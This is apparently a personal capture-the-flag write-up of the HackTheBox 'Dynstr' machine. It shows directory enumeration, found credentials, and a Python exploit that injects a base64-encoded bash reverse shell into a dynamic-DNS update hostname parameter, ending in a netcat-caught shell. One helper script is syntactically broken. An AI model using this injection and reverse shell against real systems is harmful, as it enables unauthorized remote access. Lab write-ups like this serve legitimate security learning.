# Enumeration-

\>>> Found Domain Name-

![[Pasted image 20210629130249.png]]

\>>> Some Creds-

![[Pasted image 20210629130045.png]]

User-dynadns
Pass-sndanyd

# Wfuzz-

```bash
root@napster:~/Documents/HTB/Dynstr# gobuster dir -u http://10.10.10.244/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -t 20 -o
 gobuster.txt                                                                                                                                                 
===============================================================                                                                                               
Gobuster v3.0.1                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                               
===============================================================                                                                                               
[+] Url:            http://10.10.10.244/                                                                                                                      
[+] Threads:        20                                                                                                                                        
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt                                                                  
[+] Status codes:   200,204,301,302,307,401,403                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                            
[+] Timeout:        10s                                                                                                                                       
===============================================================                                                                                               
2021/06/29 12:29:58 Starting gobuster                                                                                                                         
===============================================================                                                                                               
/.html (Status: 403)                                                                                                                                          
/.htm (Status: 403)                                                                                                                                           
/assets (Status: 301)                                                                                                                                         
/.php (Status: 403)
/. (Status: 200)
/.htaccess (Status: 403)
/.phtml (Status: 403)
/.htc (Status: 403)
/.html_var_DE (Status: 403)
/server-status (Status: 403)
/.htpasswd (Status: 403)
/.html. (Status: 403)
/.html.html (Status: 403)
/.htpasswds (Status: 403)
/.htm. (Status: 403)
/.htmll (Status: 403)
/.phps (Status: 403)
/.html.old (Status: 403)
/.ht (Status: 403)
/.html.bak (Status: 403)
/.htm.htm (Status: 403)
/nic (Status: 301)
/.hta (Status: 403)
/.htgroup (Status: 403)
```

Found an odd Sub-Directory `/nic`

On visiting the web page it was empty,so used wfuzz again-

```bash
root@napster:~/Documents/HTB/Dynstr# gobuster dir -u http://10.10.10.244/nic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -t 20
 -o gobuster1.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.244/nic
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/06/29 13:10:41 Starting gobuster
===============================================================
/.php (Status: 403)
/.html (Status: 403)
/.htm (Status: 403)
/update (Status: 200)
/. (Status: 200)
/.htaccess (Status: 403)
/.phtml (Status: 403)
/.htc (Status: 403)
/.html_var_DE (Status: 403)
/.htpasswd (Status: 403)
/.html. (Status: 403)
/.html.html (Status: 403)
/.htpasswds (Status: 403)
```

Got status 200 on `update`

Visiting the page-

![[Pasted image 20210629131330.png]]

We had credentials we found  earlier maybe we can authenticate with those credentials.

# Auth.py

\>>> Creating auth.py
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://10.10.10.244/nic/update'

response = requests.get(url, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print (response.text)
```

\>>> Executing-

```bash
root@napster:~/Documents/HTB/Dynstr# python3 Auth.py
nochg 10.10.14.119
```

We got  `nochg` in response.

Just googling nochg we cam up with the following-

https://help.dyn.com/remote-access-api/return-codes/

#### No Change Updates-

A `nochg` indicates a successful update but the IP address or other settings have not changed.

On further Enumeration from the website we came up with this article-

https://help.dyn.com/remote-access-api/perform-update/

#### Update Parameter

|Field 	|								Description 						| Additional Info |
|-------|--------------------------------------------------------------------------|---------------|
|hostname |Comma separated list of hostnames that you wish to update(up to 20 hostnames per request).|Example:`hostname=test.dyndns.org,customtest.dyndns.org`

#### Update Complete/Good Update-

I have to pass two parameter atleast to perform update i.e the hostname and myip so let's try it.  Again going back to website we know we have few dynamic dns running so let's try and get it. 

# Auth1.py-

Updated python script to perform updates-
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://10.10.10.244/nic/update'
params = {
        'my ip' : '10.10.14.119'
        'hostname' :  'test.no-ip.htb'
response = requests.get(url, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print (response.text)
```


\>>> Executing-

```bash
root@napster:~/Documents/HTB/Dynstr# python3 Auth1.py
good 10.10.14.119
```

# Creating payload-

we got the good response so we can perform update now let's look at some parameters we can tamper.  
Looking through the above perform update article I can see one intresting thing that the update will get distributed to all the linked device so if we can inject the hostname we can get the possible RCE and I thought about injecting IP but it's is not possible as it will lead to validation problem as IP cannot have character so we can inject hostname and send payload as subdomain name but we cannot use special chars as it is not allowed as a domain name so we have base64 encode the payload and send the request.

\>>>Exploit.py
```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://10.10.10.244/nic/update'
payload = b'bash -i >& /dev/tcp/10.10.14.119/9001 0>&1'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
        'my ip' : '10.10.14.119',
        'hostname' : '`echo "{}" | base64 -d | bash`"dynadns.no-ip.htb"'.format(final.decode())
        }
response = requests.get(url, auth=HTTPBasicAuth('dynadns', 'sndanyd'),params=params)
print (response.text)
```

# Executing and Getting Shell-
\>>> Executing-
```bash
root@napster:~/Documents/HTB/Dynstr# python3 Exploit.py 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTkvOTAwMSAwPiYx
```


\>>> Reverse Shell-

```bash
root@napster:~/Documents/HTB/Dynstr# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.119] from (UNKNOWN) [10.10.10.244] 60764
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$
```

![[Pasted image 20210630051739.png]]



